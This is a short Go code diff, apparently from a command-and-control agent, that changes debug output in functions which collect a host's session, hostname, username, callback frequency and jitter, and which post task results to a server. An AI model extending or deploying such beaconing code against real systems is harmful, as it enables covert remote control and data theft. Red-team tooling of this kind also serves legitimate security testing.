@@ -71,7 +71,8 @@ func GatherInfo() InitialInfo {
 		Jitter:        agent_config.JitterVal,
 	}
 	if debug.Debug {
-		fmt.Printf("[*] Gathered initial info: session: %s, hostname: %s, username: %s\n", hostInfo.Session, hostInfo.Hostname, hostInfo.Username)
+		fmt.Printf("[*] Gathered initial info:\nsession: %s, hostname: %s, username: %s\ncb freq: %d, jitter: %d\n", 
+		hostInfo.Session, hostInfo.Hostname, hostInfo.Username, hostInfo.Callback_freq, hostInfo.Jitter)
 	}
 	return hostInfo
 }
@@ -195,7 +196,7 @@ func DataShipper(serverUrl string, taskData map[string]interface{}, results stri
 	if debug.Debug {
 		fmt.Printf("[*] Shipping results for task: %s\n", taskData["task"])
 		fmt.Printf("[*] Args: %s\n", taskData["args"])
-		fmt.Printf("[*] Results: %s\n", results)
+		fmt.Printf("[*] Results:\n%s\n", results)
 	}
 	_, _ = PostJson(serverUrl, result)
 
